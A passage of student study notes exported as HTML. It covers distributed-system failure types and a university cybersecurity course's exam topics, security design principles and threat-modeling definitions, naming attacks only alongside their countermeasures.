</p></div></figure></details></li></ul><ul id="11e1a926-7344-8087-b990-c14a09d54a02" class="toggle"><li><details><summary>Replication and Failure </summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1271a926-7344-80cd-88ea-df420c46d594"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e3d3180b-c54f-484a-a43e-be8690237524" class="">replication hides/masks failure</p><ul id="1271a926-7344-801b-a50a-eb528f87a390" class="bulleted-list"><li style="list-style-type:disc">load balancing, serverless &amp; stateless allows for fault tolerance</li></ul><ul id="1271a926-7344-8051-a6d8-f2596481fd30" class="bulleted-list"><li style="list-style-type:disc">failure is inevitable and you have to manage it</li></ul></div></figure><h3 id="1271a926-7344-8058-bb5e-d9a58c5f40ba" class="">Software vs Hardware Failure</h3><p id="1271a926-7344-80c7-8e11-dccccbdd443c" class="">hardware fails predictably, <mark class="highlight-yellow">software is</mark> fundamentally different, its a lot <mark class="highlight-yellow">harder to predict</mark> and probability <mark class="highlight-yellow">cannot be calculated</mark> due to failures being <mark class="highlight-yellow">dependent </mark></p><h3 id="1271a926-7344-8094-9cb9-e610015d0df3" class="">Types of Failure</h3><ul id="1271a926-7344-809c-8825-dd1473a3db90" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">Simple/Crash</mark> Failure: server stops responding to requests, either a server or network fault. both are indistinguishable from the client and replication is a workable solution<ul id="1271a926-7344-8067-9d0a-e7b9823d268c" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><mark class="highlight-yellow_background">indistinguishable</mark></mark><mark class="highlight-yellow_background"> </mark>from a <mark class="highlight-yellow"><mark class="highlight-yellow_background">server or network fault</mark></mark></li></ul><ul id="1271a926-7344-80ae-812b-e38d9cbff536" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><mark class="highlight-yellow_background">masked with replication</mark></mark></li></ul></li></ul><ul id="1271a926-7344-8042-b6fb-f2f8f4339e00" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">Arbitrary (Byzantine)</mark> Failure: server responds randomly to request, it fails inconsistently. sone clients see correct responds and some don’t<ul id="1271a926-7344-8063-b85a-fb136b32f8be" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><mark class="highlight-yellow_background">hard to mask</mark></mark><mark class="highlight-yellow_background"> </mark><mark class="highlight-yellow"><mark class="highlight-yellow_background">with</mark></mark><mark class="highlight-yellow_background"> </mark><mark class="highlight-yellow"><mark class="highlight-yellow_background">replication</mark></mark></li></ul><ul id="1271a926-7344-80fc-ad84-dfe080d16c0f" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><mark class="highlight-yellow_background">can mask with redundancy</mark></mark>, eg: TMR</li></ul></li></ul><h3 id="1271a926-7344-8013-85f0-fa7d6fc032df" class="">Measuring Failure: Reliability &amp; Availability </h3><ul id="1271a926-7344-80f2-8f19-e45e9f22c635" class="bulleted-list"><li style="list-style-type:disc">Reliability: probability a system <mark class="highlight-yellow"><mark class="highlight-yellow_background">performs its indented function with no failures</mark></mark></li></ul><ul id="1271a926-7344-80fc-a2c2-d8557bdbe0e4" class="bulleted-list"><li style="list-style-type:disc">Availability: probability a system <mark class="highlight-yellow"><mark class="highlight-yellow_background">will be available to perform its function</mark></mark>, aka uptime </li></ul><p id="1271a926-7344-805d-8f9e-cf0eba53a134" class="">reliability and available is not the same, system can be function with little failures but have bad uptime. trade off between the two depends on the situation/context</p><p id="1271a926-7344-8098-b87c-da8bbaec2239" class="">  </p><h3 id="1271a926-7344-8003-8799-c696441a3036" class="">Server Initiated Replication</h3><figure id="1271a926-7344-80f5-80ad-d4454d905eb6" class="image"><a href="image%2084.png"><img style="width:623.984375px" src="image%2084.png"/></a></figure><h3 id="1271a926-7344-8050-b4b8-d63ca7469a3e" class="">Reliability Metrics: MTBF (Mean Time Between Failures)</h3><figure id="1271a926-7344-802a-ab1a-f56195ad9715" class="image"><a href="image%2085.png"><img style="width:623.984375px" src="image%2085.png"/></a></figure></details></li></ul></details></li></ul><ul id="11c1a926-7344-8034-a4bd-e883a58a268a" class="toggle"><li><details><summary>CYBR271</summary><figure id="11c1a926-7344-80cf-9214-eec409687d1f"><a href="https://ecs.wgtn.ac.nz/Courses/CYBR271_2024T2/ExamPreparation" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://ecs.wgtn.ac.nz/Courses/CYBR271_2024T2/ExamPreparation</div></div></a></figure><figure id="12d1a926-7344-80c9-a275-f286466e6e9d"><a href="https://gitlab.ecs.vuw.ac.nz/lms/cybr271/2024/-/tree/main/Exam%20preparation/Past%20exams?ref_type=heads" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://gitlab.ecs.vuw.ac.nz/lms/cybr271/2024/-/tree/main/Exam%20preparation/Past%20exams?ref_type=heads</div></div></a></figure><ul id="12d1a926-7344-803d-bc9a-f52300ffd14f" class="toggle"><li><details><summary>overview</summary><ol type="1" id="12d1a926-7344-8000-a4b9-f7aea1297ed4" class="numbered-list" start="1"><li>Security Principles [5]<ol type="a" id="12d1a926-7344-80f4-b787-def88bf70f00" class="numbered-list" start="1"><li>Minimize the attack surface Principle</li></ol><ol type="a" id="12d1a926-7344-8045-8f48-f58ed8e75900" class="numbered-list" start="2"><li>Defense in Depth Principle</li></ol><ol type="a" id="12d1a926-7344-8059-bf35-f23360cf0653" class="numbered-list" start="3"><li>Don’t Reinvent the Wheel Principle</li></ol><ol type="a" id="12d1a926-7344-80b5-96f0-e3301cdde75c" class="numbered-list" start="4"><li>Economy of Mechanism Principle</li></ol><ol type="a" id="12d1a926-7344-80e7-af3a-c0e6d245e353" class="numbered-list" start="5"><li>Separation of Duty Principle</li></ol><ol type="a" id="12d1a926-7344-80b5-a776-fea2ab7d2b1a" class="numbered-list" start="6"><li>Open design Principle</li></ol><ol type="a" id="12d1a926-7344-80fc-b9c0-f03c477af42d" class="numbered-list" start="7"><li>Secure the Weakest Link Principle</li></ol><ol type="a" id="12d1a926-7344-8058-bef8-d094f4be649d" class="numbered-list" start="8"><li>Least privilege Principle</li></ol><ol type="a" id="12d1a926-7344-80a3-936d-f6976e0101ee" class="numbered-list" start="9"><li>Fail securely Principle</li></ol><ol type="a" id="12d1a926-7344-80bc-a2e9-d2e027f588f5" class="numbered-list" start="10"><li>Psychological acceptability Principle</li></ol><ol type="a" id="12d1a926-7344-80d4-9de7-dc9565415369" class="numbered-list" start="11"><li>Validate Inputs Principle</li></ol><ol type="a" id="12d1a926-7344-8016-b77d-da242098132b" class="numbered-list" start="12"><li>Secure Data at Rest Principle</li></ol><ol type="a" id="12d1a926-7344-80bc-ba61-c87de6dd8ebb" class="numbered-list" start="13"><li>Avoid Bypass Attacks Principle</li></ol></li></ol><ol type="1" id="12d1a926-7344-803a-b1d4-ef8d5930f544" class="numbered-list" start="2"><li>Threat Modeling [10]<ol type="a" id="12d1a926-7344-800e-b535-f1b81e118102" class="numbered-list" start="1"><li>STRIDE <ol type="i" id="12d1a926-7344-801b-911b-c2508f8203f4" class="numbered-list" start="1"><li>interactor</li></ol><ul id="12d1a926-7344-80bc-ac5f-d4be0423c22d" class="bulleted-list"><li style="list-style-type:disc">process</li></ul><ul id="12d1a926-7344-8035-a1de-f7bcbdcfabd4" class="bulleted-list"><li style="list-style-type:disc">trust boundary </li></ul><ul id="12d1a926-7344-8047-b0cd-cde885d37a5a" class="bulleted-list"><li style="list-style-type:disc">data store</li></ul></li></ol></li></ol><ol type="1" id="12d1a926-7344-8066-8f36-ce68c7a0d299" class="numbered-list" start="3"><li>Risk Assessment and Attack Trees [10]<ol type="a" id="12d1a926-7344-808b-90f4-fa34802748c2" class="numbered-list" start="1"><li>what is risk</li></ol><ol type="a" id="12d1a926-7344-80b8-910b-f6ca90efa7d3" class="numbered-list" start="2"><li>why and when risk happens </li></ol><ol type="a" id="12d1a926-7344-80fa-9f8c-cef912406dd2" class="numbered-list" start="3"><li>threat modeling techniques:<ol type="i" id="12d1a926-7344-809d-8dae-fa4143fc1ee1" class="numbered-list" start="1"><li>attack trees</li></ol><ol type="i" id="12d1a926-7344-8082-99a9-f8c747619ccf" class="numbered-list" start="2"><li><mark class="highlight-red">Data Flow Diagram (DFD)</mark></li></ol><ol type="i" id="12d1a926-7344-80a8-82c1-c8b975c7d9c6" class="numbered-list" start="3"><li><mark class="highlight-red">STRIDE</mark><ol type="1" id="12d1a926-7344-801e-b60e-caa8337044c0" class="numbered-list" start="1"><li>interactor</li></ol><ul id="12d1a926-7344-80db-8a2f-ec9639eb0dab" class="bulleted-list"><li style="list-style-type:disc">process</li></ul><ul id="12d1a926-7344-8087-8d39-e912381bcb5d" class="bulleted-list"><li style="list-style-type:disc">trust boundary </li></ul><ul id="12d1a926-7344-8066-baf3-ff7784a570e6" class="bulleted-list"><li style="list-style-type:disc">data store</li></ul></li></ol><ol type="i" id="12d1a926-7344-80e4-ab48-df264077317c" class="numbered-list" start="4"><li><mark class="highlight-red">DREAD</mark>: Qualitative Risk</li></ol><ol type="i" id="12d1a926-7344-80a0-aa2b-fa2d1009b73d" class="numbered-list" start="5"><li>FAIR: Quantitively Risk</li></ol><ol type="i" id="12d1a926-7344-80a2-b3a2-e7a899b25fde" class="numbered-list" start="6"><li>Threat Rating</li></ol></li></ol></li></ol><ol type="1" id="12d1a926-7344-8026-990d-d2d6a6289aa2" class="numbered-list" start="4"><li>Security Reviews, Testing, and Supply Chain Attacks [10]<ol type="a" id="12d1a926-7344-8045-a390-d4ceb525e0d7" class="numbered-list" start="1"><li>Security code reviews</li></ol><ol type="a" id="12d1a926-7344-80aa-8603-cbe3b847f03d" class="numbered-list" start="2"><li>Security testing</li></ol><ol type="a" id="12d1a926-7344-801d-bbb0-e6b89edde5ca" class="numbered-list" start="3"><li>Bug bars</li></ol><ol type="a" id="12d1a926-7344-80e4-bb92-f85306d36f0a" class="numbered-list" start="4"><li><mark class="highlight-red">supply chain attacks</mark><ol type="i" id="12d1a926-7344-8043-8858-d1ef472e2d42" class="numbered-list" start="1"><li>point of failure that attacks the rest of the supply chain</li></ol><ol type="i" id="12d1a926-7344-8056-8859-c5c8e45b038d" class="numbered-list" start="2"><li>Supply chain vulnerabilities</li></ol><ol type="i" id="12d1a926-7344-802d-bb6a-ef1381dba34c" class="numbered-list" start="3"><li>examples</li></ol><ol type="i" id="12d1a926-7344-8046-b76b-c6dfc57df411" class="numbered-list" start="4"><li>mitigations</li></ol></li></ol></li></ol><ol type="1" id="12d1a926-7344-8085-b788-f47ed526a154" class="numbered-list" start="5"><li><mark class="highlight-red">Privilege Escalation</mark> [10]<ol type="a" id="12d1a926-7344-80f1-8435-e67f1bdb349e" class="numbered-list" start="1"><li>Access Control Mechanisms: DAC</li></ol><ol type="a" id="12d1a926-7344-8080-bc8a-d4f67cfcd407" class="numbered-list" start="2"><li>Unix file perms, user/root, groups, others</li></ol><ol type="a" id="12d1a926-7344-8019-ace8-f783ccb2eef4" class="numbered-list" start="3"><li>9 bit permission model</li></ol><ol type="a" id="12d1a926-7344-8088-b8c6-e5af034b5e93" class="numbered-list" start="4"><li>Privileged Programs<ol type="i" id="12d1a926-7344-8047-bddb-e43823a0edb7" class="numbered-list" start="1"><li>Two-Tier Approach</li></ol><ol type="i" id="12d1a926-7344-80de-8888-d2ee71581436" class="numbered-list" start="2"><li>types: Daemons, set-UID</li></ol></li></ol><ol type="a" id="12d1a926-7344-8052-bfeb-e783d2973d1f" class="numbered-list" start="5"><li>SET UID attack</li></ol></li></ol><ol type="1" id="12d1a926-7344-8056-ab42-ed390feac970" class="numbered-list" start="6"><li><mark class="highlight-red">Buffer Overflow </mark>and Return-to-libc [20]<ol type="a" id="12d1a926-7344-8031-b2d4-f41fd6314308" class="numbered-list" start="1"><li>Memory Layout &amp; Function Memory Allocation</li></ol><ol type="a" id="12d1a926-7344-8062-ac7e-cca4aab61ec9" class="numbered-list" start="2"><li>Code Example</li></ol><ol type="a" id="12d1a926-7344-809e-8112-dfb6d05b5ae4" class="numbered-list" start="3"><li>Challenges in Exploitation </li></ol><ol type="a" id="12d1a926-7344-80a5-94b8-ce132c399d9b" class="numbered-list" start="4"><li>Shellcode</li></ol><ol type="a" id="12d1a926-7344-80e8-8600-c584a543d2d0" class="numbered-list" start="5"><li>Counter Measures<ol type="i" id="12d1a926-7344-8015-be5c-fe88697f084b" class="numbered-list" start="1"><li>Developer Approach</li></ol><ol type="i" id="12d1a926-7344-8083-8dac-ca142ccd4b0d" class="numbered-list" start="2"><li>OS Approaches: address space layout randomization (ASLR)</li></ol><ol type="i" id="12d1a926-7344-8025-a413-f9dc329c656c" class="numbered-list" start="3"><li>OS Approaches: shell program defense</li></ol><ol type="i" id="12d1a926-7344-80b2-a2e6-e592a857ffbd" class="numbered-list" start="4"><li>OS Approaches: Non-executable Stack</li></ol><ol type="i" id="12d1a926-7344-80f2-a6b9-ee617e0d5c52" class="numbered-list" start="5"><li>Compiler Approaches: stack guard </li></ol></li></ol></li></ol><ol type="1" id="12d1a926-7344-8019-81fc-d3c298fd1ded" class="numbered-list" start="7"><li><mark class="highlight-red">Format String</mark> [12]<ol type="a" id="12d1a926-7344-806b-8bee-f645c57b323b" class="numbered-list" start="1"><li>printf and variadic arguments</li></ol><ol type="a" id="12d1a926-7344-8029-a083-de83313ea37e" class="numbered-list" start="2"><li>Format String Vulnerability</li></ol><ol type="a" id="12d1a926-7344-806b-9e30-f6f33da70d9d" class="numbered-list" start="3"><li>Format String Attacks</li></ol><ol type="a" id="12d1a926-7344-8012-98fc-ee1fb5cd5c7b" class="numbered-list" start="4"><li>width modifier and %n format specifier</li></ol><ol type="a" id="12d1a926-7344-80a8-81f4-e7832c03b42e" class="numbered-list" start="5"><li>Countermeasures<ol type="i" id="12d1a926-7344-8002-a336-e463a7e6b041" class="numbered-list" start="1"><li>Developer Approach</li></ol><ol type="i" id="12d1a926-7344-80f0-89f2-ff7ba1fb351e" class="numbered-list" start="2"><li>Compiler Approach</li></ol><ol type="i" id="12d1a926-7344-8016-8b9d-e77652f7ee3f" class="numbered-list" start="3"><li>Address Randomization: just makes it more dificult </li></ol><ol type="i" id="12d1a926-7344-8017-8bb7-f470a0f70dfd" class="numbered-list" start="4"><li>non executable stack/heaps: WILL NOT WORK (return to libc)</li></ol><ol type="i" id="12d1a926-7344-80c3-ac3c-ec67bcdf5a70" class="numbered-list" start="5"><li>stack guard WILL NOT WORK (can target what we want)</li></ol></li></ol></li></ol><ol type="1" id="12d1a926-7344-803a-92b3-cf047e85b351" class="numbered-list" start="8"><li>Cross-site Scripting (XSS) [10]<ol type="a" id="12d1a926-7344-80ff-9c4f-f26c9d6e6ecb" class="numbered-list" start="1"><li>reflective vs stored xxs</li></ol><ol type="a" id="12d1a926-7344-803c-9c3d-c07758d5e621" class="numbered-list" start="2"><li>damage potential <ol type="i" id="12d1a926-7344-803a-86c9-d2d2a48accb1" class="numbered-list" start="1"><li>befriend attack</li></ol><ol type="i" id="12d1a926-7344-805d-b489-d5c2ad7373bb" class="numbered-list" start="2"><li>defacing</li></ol></li></ol><ol type="a" id="12d1a926-7344-8012-9223-dce5b2ed8117" class="numbered-list" start="3"><li>self proagating xxs worm</li></ol><ol type="a" id="12d1a926-7344-800d-aa77-d2c36575726b" class="numbered-list" start="4"><li>counter messures <ol type="i" id="12d1a926-7344-807c-b735-d9c5fd98c862" class="numbered-list" start="1"><li>filter approach</li></ol><ol type="i" id="12d1a926-7344-802c-8168-d82254149487" class="numbered-list" start="2"><li>encoding approach</li></ol><ol type="i" id="12d1a926-7344-80aa-98d3-cca02c1da240" class="numbered-list" start="3"><li>elgg approach</li></ol><ol type="i" id="12d1a926-7344-807f-a98d-dcf79ed5709a" class="numbered-list" start="4"><li>content security policy</li></ol></li></ol></li></ol><ol type="1" id="12d1a926-7344-80cd-bedb-fa0b25396178" class="numbered-list" start="9"><li>Cross-site Request Forgery (CSRF) [8]<ol type="a" id="12d1a926-7344-8089-b325-c27c18f0c0bf" class="numbered-list" start="1"><li>cookies</li></ol><ol type="a" id="12d1a926-7344-80e1-b20e-d8885f946bf9" class="numbered-list" start="2"><li>CSRF with get</li></ol><ol type="a" id="12d1a926-7344-80d5-bed6-c8d1c611c99e" class="numbered-list" start="3"><li>CSRF with post</li></ol><ol type="a" id="12d1a926-7344-80d6-ac4a-e5a624a3bda9" class="numbered-list" start="4"><li>cause of CSRF </li></ol><ol type="a" id="12d1a926-7344-8090-9738-f32b6bdf3a23" class="numbered-list" start="5"><li>counter measures<ol type="i" id="12d1a926-7344-8044-a73e-f8e56acc8c9d" class="numbered-list" start="1"><li>referrer header</li></ol><ol type="i" id="12d1a926-7344-8058-a461-e46c7d90fa69" class="numbered-list" start="2"><li>secret token</li></ol><ol type="i" id="12d1a926-7344-80ab-9609-c5638ddf8c0d" class="numbered-list" start="3"><li>Elgg’s countermeasure</li></ol><ol type="i" id="12d1a926-7344-8074-ab66-c71d9be453ff" class="numbered-list" start="4"><li>Same-Site cookies</li></ol></li></ol></li></ol><ol type="1" id="12d1a926-7344-80a8-88fd-cadf2f362299" class="numbered-list" start="10"><li><mark class="highlight-red">SQL-Injection</mark> [5]<ol type="a" id="12d1a926-7344-80a7-a231-cab74bd147ec" class="numbered-list" start="1"><li>commands</li></ol><ol type="a" id="12d1a926-7344-805a-8aa8-e51513af8667" class="numbered-list" start="2"><li>attack channel</li></ol><ol type="a" id="12d1a926-7344-80de-a92c-d8789937e0d1" class="numbered-list" start="3"><li>attack example</li></ol><ol type="a" id="12d1a926-7344-806a-885f-e3774ae435d9" class="numbered-list" start="4"><li>modiftying database</li></ol><ol type="a" id="12d1a926-7344-8025-8b95-ea2e0eb63ce7" class="numbered-list" start="5"><li>multiple sql statements</li></ol><ol type="a" id="12d1a926-7344-80c0-864f-c4d6e49253a9" class="numbered-list" start="6"><li>cause of sql injection</li></ol><ol type="a" id="12d1a926-7344-80a0-a627-cdc5c841fea8" class="numbered-list" start="7"><li>counter measures<ol type="i" id="12d1a926-7344-80fd-961a-d7cc55a6a360" class="numbered-list" start="1"><li>filtering and encoding</li></ol><ol type="i" id="12d1a926-7344-8003-8158-f01a9b80c6c4" class="numbered-list" start="2"><li>prepared statements</li></ol></li></ol></li></ol></details></li></ul><ul id="12d1a926-7344-8057-b85a-ceaacd4f9bfc" class="toggle"><li><details><summary>Security Principles</summary><h3 id="12d1a926-7344-80ff-8e38-edbc085949d3" class="">Minimize Attack Surface</h3><p id="12d1a926-7344-80bd-8ff5-d82225549161" class=""> attack surface are all <mark class="highlight-yellow">points where an attacker can get into a system</mark> and take data out</p><ul id="12d1a926-7344-800f-aa43-c64ec622623c" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">smaller surface is harder to attack</mark></li></ul><ul id="12d1a926-7344-806a-a5ab-ee5eff62e029" class="bulleted-list"><li style="list-style-type:disc">changes/new features to the system increases attack surface</li></ul><ul id="12d1a926-7344-807f-b9a7-c876dd66be88" class="bulleted-list"><li style="list-style-type:disc">software attack surfaces are:<ol type="1" id="12d1a926-7344-80a5-96ca-fc62586cd79a" class="numbered-list" start="1"><li><mark class="highlight-yellow">paths for data in and out</mark> of an application</li></ol><ol type="1" id="12d1a926-7344-80c9-82f9-f25d1953f190" class="numbered-list" start="2"><li><mark class="highlight-yellow">code </mark>that<mark class="highlight-yellow"> protects these paths </mark>(auth, logging, validation)</li></ol><ol type="1" id="12d1a926-7344-8080-a3a1-ed61a28f171e" class="numbered-list" start="3"><li><mark class="highlight-yellow">valuable data</mark> used in an application (keys, ip, personal data)</li></ol><ol type="1" id="12d1a926-7344-8051-b68b-c0e121f36016" class="numbered-list" start="4"><li><mark class="highlight-yellow">code </mark>that <mark class="highlight-yellow">protects valuable data</mark> (encryption, checksum auditing)</li></ol></li></ul><h3 id="12d1a926-7344-8092-8f9c-d9c1f10a40ed" class="">Defense in Depth</h3><p id="12d1a926-7344-8014-9c3d-c54c98391a8a" class="">use <mark class="highlight-yellow">multiple layers of security defenses </mark></p><ul id="12d1a926-7344-805d-ba4a-eba0426dd97d" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">if one defense fails, you have another layer</mark></li></ul><ul id="12d1a926-7344-80a9-86e3-d917fb6cab6e" class="bulleted-list"><li style="list-style-type:disc">DID has issues:<ul id="12d1a926-7344-80a4-8131-f2c738e87593" class="bulleted-list"><li style="list-style-type:circle">timelines or laziness lead devs to ignore DID</li></ul><ul id="12d1a926-7344-8012-83c5-eae74d657433" class="bulleted-list"><li style="list-style-type:circle">security is hard to get right</li></ul><ul id="12d1a926-7344-80f8-81b8-ff470ccff76b" class="bulleted-list"><li style="list-style-type:circle">change in conditions can make DID expensive </li></ul></li></ul><h3 id="12d1a926-7344-80ec-8b8e-ebf98212e947" class="">Don’t Reinvent the Wheel</h3><p id="12d1a926-7344-808a-b6a7-ec08529d9bd6" class="">security is hard to get right, so <mark class="highlight-yellow">use other people’s implementations of security</mark> rather than making your own</p><ul id="12d1a926-7344-80d7-914e-c3086cc327ca" class="bulleted-list"><li style="list-style-type:disc">use other people’s <mark class="highlight-yellow">code/libraries which already work </mark>and are <mark class="highlight-yellow">known to be secure</mark></li></ul><ul id="12d1a926-7344-80af-9df6-dcb43676a308" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">written by smarter people </mark>and has been <mark class="highlight-yellow">thoroughly vetted</mark></li></ul><ul id="12d1a926-7344-8096-a5c0-f3176fb901c9" class="bulleted-list"><li style="list-style-type:disc"><del>Cryptography is difficult to implement well. Can you trust your own algorithm? is it worth your time?</del></li></ul><ul id="12d1a926-7344-8024-8b6c-fe753d507265" class="bulleted-list"><li style="list-style-type:disc"><del>Web frameworks simplify development. framework is mature and has effort put into it making it secure: Input validation, SQL injection avoidance, XSS avoidance, CSRF protection</del></li></ul><h3 id="12d1a926-7344-80a3-ba09-d38368824c4c" class="">Economy of Mechanism</h3><p id="12d1a926-7344-8059-9db0-d6701ea4f43e" class="">security mechanisms should be as <mark class="highlight-yellow">simple as possible </mark></p><ul id="12d1a926-7344-8021-a2b0-d11f72714a1c" class="bulleted-list"><li style="list-style-type:disc">complex code is harder to test and patch later</li></ul><ul id="12d1a926-7344-80f9-a407-d98db5cbebae" class="bulleted-list"><li style="list-style-type:disc">high complexity leads to more defects</li></ul><ul id="12d1a926-7344-8080-8c98-c999ceefdea4" class="bulleted-list"><li style="list-style-type:disc">security mechanism: tools &amp; techniques to implement security</li></ul><h3 id="12d1a926-7344-80ab-ba10-e1dbdaf809b1" class="">Separation of Duty</h3><p id="12d1a926-7344-8047-ab9d-fd5e2cf9e712" class="">privileges should not be granted based on a single conditions</p><ul id="12d1a926-7344-800c-8f2c-c0ce8b64126a" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">require multiple components</mark> to agree before<mark class="highlight-yellow"> granting privilege</mark></li></ul><ul id="12d1a926-7344-80bd-bc55-d19ab9b2a338" class="bulleted-list"><li style="list-style-type:disc">prevents breach of one component leading to breach of others</li></ul><ul id="12d1a926-7344-801c-bb71-c2aabe1927a1" class="bulleted-list"><li style="list-style-type:disc">Two Factor Auth eg: attacker needs both password and token</li></ul><h3 id="12d1a926-7344-8006-917d-f9e4cd91ebf1" class="">Open Design</h3><p id="12d1a926-7344-8050-bcf5-eeb3c5099775" class=""><mark class="highlight-yellow">security should not depend on secrecy or obscurity</mark> of the design/implementation</p><ul id="12d1a926-7344-800d-b1c5-d5ec80f3cf65" class="bulleted-list"><li style="list-style-type:disc">open design allows for others to test and improve it</li></ul><ul id="12d1a926-7344-8075-b583-f2a45c702b62" class="bulleted-list"><li style="list-style-type:disc">if its not open: you don’t know when attackers find vulnerabilities </li></ul><ul id="12d1a926-7344-809d-b1a1-d18ad1e2d99b" class="bulleted-list"><li style="list-style-type:disc">hard to keep algorithm/method secret</li></ul><ul id="12d1a926-7344-809e-9291-ee07b9168aae" class="bulleted-list"><li style="list-style-type:disc">openness to design, not data</li></ul><h3 id="12d1a926-7344-809d-abb9-da35922dc69f" class="">Secure the Weakest Link</h3><p id="12d1a926-7344-80c3-9d46-f862afcc4c03" class=""><mark class="highlight-yellow">attackers will target weak points </mark>in systems,<mark class="highlight-yellow"> weakest link should be strong</mark></p><ul id="12d1a926-7344-802f-ad6c-c479b00f3029" class="bulleted-list"><li style="list-style-type:disc">no point of a strong door next to thin glass windows</li></ul><ul id="12d1a926-7344-802d-a86b-fa9b9079bf71" class="bulleted-list"><li style="list-style-type:disc">OS can be the weakest link</li></ul><ul id="12d1a926-7344-8066-bbc1-e5e30e609d45" class="bulleted-list"><li style="list-style-type:disc">threat modeling leads you to the weakest link</li></ul><h3 id="12d1a926-7344-8002-9a75-f78b60acd448" class="">Least Privilege</h3><p id="12d1a926-7344-806d-9a74-f149f3a1b159" class=""><mark class="highlight-yellow">don’t give people more privilege than they need</mark></p><ul id="12d1a926-7344-80e9-98b3-c2d589dbc248" class="bulleted-list"><li style="list-style-type:disc">may lead to abuse</li></ul><h3 id="12d1a926-7344-80fc-8d4b-f36893cc9f56" class="">Fail Securely</h3><p id="12d1a926-7344-806b-b035-ce1745bfc94e" class="">handle failures securely and <mark class="highlight-yellow">return system to a proper state</mark></p><ul id="12d1a926-7344-80c8-ae2b-dacb4f4c75e7" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">error messages disclose information</mark> to attackers</li></ul><ul id="12d1a926-7344-80fb-a0ad-f23615cbbdea" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">production </mark>code shouldn’t have<mark class="highlight-yellow"> debug messages</mark><ul id="12d1a926-7344-80c2-af38-f81892b0bdc9" class="bulleted-list"><li style="list-style-type:circle">an attacker can break a website and see what info and messages show up based on the attack</li></ul></li></ul><ul id="12d1a926-7344-8033-81f3-eb61c12c89b3" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">failure </mark>leading to unhandled state can lead to DOS</li></ul><h3 id="12d1a926-7344-80c5-85c6-e0fb76a8da08" class="">Psychological Acceptability</h3><p id="12d1a926-7344-80c4-b315-eb0a7b36ad11" class="">resources accessibility should <mark class="highlight-yellow">not be more difficult with security</mark> mechanism </p><ul id="12d1a926-7344-8031-a1ac-e8bbbe4f5db8" class="bulleted-list"><li style="list-style-type:disc">security and user friendliness are contradictory<ul id="12d1a926-7344-801c-9863-e3c58d27ea1a" class="bulleted-list"><li style="list-style-type:circle">security should work with the user</li></ul></li></ul><ul id="12d1a926-7344-801f-ac97-dcc4ac744d63" class="bulleted-list"><li style="list-style-type:disc">security should be unobtrusive as possible </li></ul><ul id="12d1a926-7344-80f7-b9b0-c60a2a24c523" class="bulleted-list"><li style="list-style-type:disc">eg: pass phrases are easier to remember than random numbers</li></ul><h3 id="12d1a926-7344-8081-855d-f31e1647d81a" class="">Validate Inputs</h3><p id="12d1a926-7344-80c5-8c14-e2bb06e934e9" class=""><mark class="highlight-yellow">shouldn’t trust all user inputs:</mark> validate and monitor them to catch malicious ones</p><ul id="12d1a926-7344-8054-8fa4-e63e6d0305f6" class="bulleted-list"><li style="list-style-type:disc">inputs coming from outside your app may not agree with your exact input requirements </li></ul><ul id="12d1a926-7344-800a-abcf-e009147367e3" class="bulleted-list"><li style="list-style-type:disc">inputs that don’t meet expectations may lead to undefined program state</li></ul><h3 id="12d1a926-7344-80ad-abb4-d5604431d43b" class="">Secure Data at Rest</h3><p id="12d1a926-7344-80ce-a7ac-e73b5318306b" class=""><mark class="highlight-yellow"><mark class="highlight-default_background">data at rest must be protected</mark></mark> to meet security requirements</p><h3 id="12d1a926-7344-80eb-907f-ddac7fc567b7" class="">Avoid Bypass Attacks</h3><p id="1361a926-7344-80d2-a63b-e319048b633c" class="">attacker acting as authenticated user without providing valid credentials: access to resources while avoiding auth</p><ul id="12d1a926-7344-8043-8224-dafa1c39b4a0" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">attackers that bypass authentication </mark>or authorization are the most dangerous</li></ul><ul id="12d1a926-7344-8021-aa3d-f55a1d8e4b95" class="bulleted-list"><li style="list-style-type:disc">forgot my password eg: a way to bypass authentication</li></ul></details></li></ul><ul id="12d1a926-7344-80f1-8df3-fc8612e85165" class="toggle"><li><details><summary>Threat Modeling (STRIDE &amp; DFD)</summary><ul id="1301a926-7344-8098-8b6b-f2a24730fa87" class="toggle"><li><details><summary>What is it</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-80f6-bca1-d8f210303fd0"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="34c0866a-905f-4a2d-a188-dabf5cbf784a" class="">goal of threat <mark class="highlight-yellow">modeling is to find and prevent potential attacks</mark> from happening: so we can stop them later</p><ul id="12e1a926-7344-809d-ac6c-dc353a95d974" class="bulleted-list"><li style="list-style-type:disc">definitions <ul id="12e1a926-7344-80fb-9b84-d37e1cba65ed" class="bulleted-list"><li style="list-style-type:circle">assets: something that should be protected</li></ul><ul id="12e1a926-7344-80b0-a8b2-c7ea69592ed2" class="bulleted-list"><li style="list-style-type:circle">vulnerability: weaknesses/lack of protection</li></ul><ul id="12e1a926-7344-8059-b3e6-e67e125cc3d0" class="bulleted-list"><li style="list-style-type:circle">threat: something that could negatively impact assets</li></ul><ul id="12e1a926-7344-8064-b637-d9df9bfdb730" class="bulleted-list"><li style="list-style-type:circle">risk: possibility of a threat exploiting vulnerability to harm assets</li></ul><ul id="12e1a926-7344-80c0-a169-c739d12a7491" class="bulleted-list"><li style="list-style-type:circle">Security control/mitigations: protection against threats, reduce vulnerability</li></ul></li></ul><ul 